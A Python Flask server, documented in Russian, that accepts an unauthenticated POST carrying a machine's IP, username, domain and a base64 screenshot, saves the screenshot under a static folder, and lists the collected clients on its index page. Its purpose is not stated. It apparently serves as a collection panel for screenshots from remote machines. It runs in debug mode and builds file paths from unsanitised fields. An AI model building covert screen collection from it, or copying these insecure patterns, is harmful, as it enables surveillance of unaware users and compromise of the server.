from flask import Flask, request, render_template
import traceback
import base64
import os
import time
import re


def is_base64(s):
    """
    Проверяет, является ли строка корректным base64-encoded значением.

    Функция проверяет, соответствует ли строка формату base64 и может быть корректно декодирована.

    Параметры:
        - s (str): Строка для проверки.

    Возвращаемые значения:
        - bool: Возвращает True, если строка является корректным base64, иначе False.

    Примечания:
        - Строка должна содержать только символы из алфавита base64 (A-Z, a-z, 0-9, '+', '/', '=').
        - Дополнительно проверяется возможность декодирования строки с использованием метода `base64.b64decode` с параметром `validate=True`.
        - В случае невалидного base64-формата, либо некорректного значения строки функция возвращает False.

    Пример использования:
        is_base64("U29mdHdhcmUgRW5naW5lZXJpbmc=")  # Вернет True
        is_base64("InvalidBase64!String")  # Вернет False
    """
    base64_pattern = re.compile(r'^[A-Za-z0-9+/=]+$')
    if not base64_pattern.match(s):
        return False
    
    try:
        decoded = base64.b64decode(s, validate=True)
        return True
    except (base64.binascii.Error, ValueError):
        return False


app = Flask(__name__, static_url_path='/static', static_folder='static')


# Папка для хранения скриншотов
SCREENSHOT_DIR = "static/screenshots"
if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

# Информация о клиентах
clients = {}

# Структура клиента
# clients = {
#     '192.168.0.1': {
#         'domain': 'example.com',
#         'machine': 'Machine1',
#         'ip': '192.168.0.1',
#         'user': 'Client1',
#         'screenshot': 'screenshot_client1_192.168.0.1.png',
#         'timestamp': '2024-11-07 12:34:56'
#     }
# }


@app.route('/api/add_client', methods=['POST'])
def add_client():
    """
    Добавляет нового клиента в систему и сохраняет его скриншот.

    Принимает POST-запрос с JSON-данными, которые содержат информацию о клиенте (IP-адрес,
    имя пользователя, домен, машина и скриншот в формате base64). Если скриншот передан и является
    корректным base64-строкой, он сохраняется на сервере.

    Параметры:
        - ip (str): IP-адрес клиента.
        - username (str): Имя пользователя.
        - domain (str): Домен клиента (по умолчанию 'unknown').
        - machine (str): Название машины (по умолчанию 'unknown').
        - screenshot (str, optional): Скриншот в формате base64 (по умолчанию None).

    Пример запроса:
        POST /api/add_client
        {
            "ip": "192.168.1.1",
            "username": "user1",
            "domain": "example.com",
            "machine": "machine1",
            "screenshot": "base64_encoded_data_here"
        }

    Ответ:
        - 200: "Client added" – клиент успешно добавлен.
        - 500: "Internal Server Error" – ошибка при обработке запроса.

    Логирование:
        - В случае ошибки запросов выводится ошибка в журнал.
        - В случае неверных данных для скриншота записывается предупреждение в журнал.

    Возвращаемые значения:
        - str: Сообщение о статусе операции.
        - int: Код состояния HTTP (200 или 500).

    Исключения:
        - В случае возникновения ошибок в процессе обработки запроса (например, ошибки при сохранении файла или обработки данных)
          возвращается ошибка 500.
    """
    try:
        data = request.get_json()

        ip = data.get('ip')
        username = data.get('username')
        domain = data.get('domain', 'unknown')
        machine = data.get('machine', 'unknown')
        screenshot_data = data.get('screenshot')
        # app.logger.info(f"screenshot_data: {screenshot_data}")
        # Сохранить изображение на сервере
        if screenshot_data and is_base64(screenshot_data):
            screenshot_filename = f"{username}_{ip}_{int(time.time())}.png"
            screenshot_path = os.path.join(SCREENSHOT_DIR, screenshot_filename)
            with open(screenshot_path, 'wb') as f:
                f.write(base64.b64decode(screenshot_data))
        else:
            screenshot_filename = None
            app.logger.info('Invalid base64 data.')

        clients[ip] = {
            'domain': domain,
            'machine': machine,
            'ip': ip,
            'user': username,
            'screenshot': screenshot_filename,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())
        }

        return "Client added", 200

    except Exception as e:
        app.logger.error("Error in /api/add_client endpoint: %s", traceback.format_exc())
        return "Internal Server Error", 500


@app.route('/', methods=['GET'])
def show_clients():
    """
    Обрабатывает запрос на главную страницу и отображает список клиентов.

    Эта функция обрабатывает GET-запрос на корневой маршрут приложения ('/'), извлекает данные о клиентах 
    из хранилища и передает их в шаблон HTML для отображения. 

    Параметры:
        - Отсутствуют.

    Возвращаемые значения:
        - str: Возвращает отрендеренный HTML-шаблон с данными клиентов, который будет отправлен в ответ на запрос.

    Примечания:
        - Данные о клиентах передаются в шаблон через контекст, где переменная `clients` содержит список или словарь с клиентами.
        - Шаблон `index.html` должен содержать логику для отображения данных клиентов в таблице.

    Пример использования:
        Веб-страница, отображающая список клиентов, будет доступна по корневому адресу веб-приложения.
    """
    return render_template('index.html', clients=clients)

if __name__ == '__main__':
    app.run(debug=True)
